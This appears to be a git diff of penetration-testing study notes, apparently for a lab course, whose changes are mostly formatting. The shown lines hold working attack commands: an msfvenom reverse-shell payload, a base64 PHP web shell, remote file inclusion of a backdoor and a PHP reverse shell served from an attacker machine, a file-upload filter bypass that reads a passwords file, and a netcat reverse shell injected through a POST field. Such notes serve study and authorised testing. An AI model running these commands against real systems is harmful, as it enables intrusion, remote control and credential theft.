@@ -836,7 +836,7 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   sha256sum malware.txt //calculate SHA256 hash of file
   xxd -b malware.txt  //inspecting the file content with xxd
   ```
-- Generate malicious PE meterpreter shell
+- Generate malicious PE meterpreter shell  
   `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe`
 - Bypass AV detection
    - on disk (packers, UPX, enigma protector tool)
@@ -2832,8 +2832,9 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     base64: echo -n `<?php echo system($_GET["cmd"]);?>`   
     `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname -a"`
 - 9.2.3 Remote File inclusion (RFI)
-  - RFI to include /usr/share/webshells/php/simple-backdoor.php + cmd to **cat /home/elaine/.ssh/authorized_keys**
-    cd /usr/share/webshells/php/  `python3 -m http.server 80`
+  - RFI to include /usr/share/webshells/php/simple-backdoor.php + cmd to **cat /home/elaine/.ssh/authorized_keys**  
+    `cd /usr/share/webshells/php/`   
+    `python3 -m http.server 80`
     `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.221/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"`
   - RFI to include **PHP reverse shell** from Pentestmonkey's GitHub + change the IP to kali + port 4444 + exploit port 8001
     1. download reverse_shell from https://github.com/pentestmonkey/php-reverse-shell
@@ -2842,8 +2843,8 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     4. nc -nvlp 4444
     5. `curl "http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.221/php-reverse-shell.php"`  
 - 9.3.1 Using executable files
-  - File upload + **bypass file extension filter** (.pHp) + read windows file C:\xampp\passwords.txt
-    `curl http://192.168.224.189/meteor/uploads/simple-backdoor.pHP?cmd=type%20C:\\xampp\\passwords.txt`
+  - File upload + **bypass file extension filter** (.pHp) + read windows file C:\xampp\passwords.txt  
+    `curl http://192.168.224.189/meteor/uploads/simple-backdoor.pHP?cmd=type%20C:\\xampp\\passwords.txt`  
   - **Web shell code executio**n
     start Apache of webshell + nc listener + upload php-reverse-shell.php. Uploaded files in /var/www/html/  
     `curl http://192.168.224.16/php-reverse-shell.php`  
@@ -2882,9 +2883,9 @@ AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")`
     cd C:\Users\Administrator\Desktop
     type secrets.txt
     ```    
-  - Netcat reverse shell + elevated priviledge (sudo su) + linux
-    `nc 192.168.45.170 4444 -e /bin/bash`
-    `curl -X POST --data 'Archive=nc%20192.168.45.170%204444%20-e%20%2Fbin%2Fbash' http://192.168.203.16/archive`
+  - Netcat reverse shell + elevated priviledge (sudo su) + linux  
+    `nc 192.168.45.170 4444 -e /bin/bash`  
+    `curl -X POST --data 'Archive=nc%20192.168.45.170%204444%20-e%20%2Fbin%2Fbash' http://192.168.203.16/archive`  
     whoami  
     sudo su  
     cat /opt/config.txt  
